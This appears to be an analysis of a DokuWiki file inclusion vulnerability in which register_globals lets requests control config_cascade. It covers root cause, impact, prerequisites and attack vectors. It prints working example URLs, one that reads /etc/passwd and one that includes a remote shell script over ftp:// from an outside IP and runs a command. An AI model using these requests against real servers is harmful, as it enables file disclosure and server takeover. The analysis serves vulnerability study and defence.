Based on the provided content, here's a breakdown of the vulnerability described:

**Root Cause:**

*   The vulnerability stems from a flaw in how DokuWiki handles configuration files. Specifically, the `config_cascade` array, which defines the order in which configuration files are loaded, can be manipulated via the `register_globals` setting being enabled, allowing an attacker to control which files are included.
*   The `inc/init.php` script iterates through the `$config_cascade` array, using `file_exists()` to check if the specified files exist before including them. Although `file_exists()` prevents direct remote file inclusion, it can be bypassed using other methods.

**Weaknesses/Vulnerabilities Present:**

*   **Local File Inclusion (LFI):** The primary vulnerability is LFI. By manipulating the `config_cascade` array, attackers can include arbitrary local files.
*   **Temporary File Inclusion:** With `file_uploads` enabled, an attacker can upload a file containing malicious code, then include the temporary file using the same LFI vulnerability to execute it.
*   **Remote File Inclusion (RFI) via FTP Wrapper:** If `allow_url_include` and `allow_url_fopen` are enabled, an attacker can include files from a remote FTP server using the `ftp://` wrapper.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including files containing PHP code, attackers can execute arbitrary commands on the server. This can lead to complete compromise of the application and the server.
*   **Information Disclosure:** Attackers can read sensitive files from the server's file system, such as configuration files and system files.

**Attack Vectors:**

*   **HTTP GET/POST parameters:** The `config_cascade` array is manipulated using URL parameters or POST data.
    *   `http://[host]/[path]/doku.php?config_cascade[main][default][]=/etc/passwd` (LFI)
    *   `http://[host]/dokuwiki-2009-02-14/doku.php?config_cascade[main][default][]=ftp://anonymous:anon@1.12.123.123/folder/sh.php&cmd=ls%20-la>out.txt` (RFI via FTP)
    *   A multipart form upload to include a temporary uploaded file, combined with manipulation of the `config_cascade` array (Temporary file inclusion)
*   **File Upload:** In the temporary file inclusion scenario, the attacker uses a form to upload a file containing malicious PHP code.

**Required Attacker Capabilities/Position:**

*   **Network Access:** Attackers need to be able to send HTTP requests to the vulnerable DokuWiki instance.
*   **`register_globals` enabled:** The `register_globals` PHP setting must be enabled on the server for the primary attack vector (manipulating `config_cascade` via GET/POST) to work.
*   **`allow_url_fopen` and `allow_url_include` (for RFI via FTP):** These PHP settings must be enabled for remote file inclusion via the FTP wrapper.
*   **`file_uploads` enabled (for temporary file inclusion):** This PHP setting must be enabled for an attacker to include temporary files after uploading a file.
*   **Ability to Craft Malicious Payloads:**  The attacker needs to have the ability to create PHP code that performs the desired action (e.g., command execution).
*   **Optionally, ability to upload files:** This is necessary to trigger the temporary file inclusion exploit. This can be done via the `mediamanager.php` page.

**Additional notes:**

*   The exploit-db entry #8781 notes the vulnerability as a LFI due to usage of `file_exists()`, while #8812 proves that it is possible to do RFI by using `ftp://` wrapper.

This vulnerability is considered serious because it can lead to complete server compromise, and is more detailed than the general description of 'file inclusion vulnerability' that might be provided by a basic CVE description.
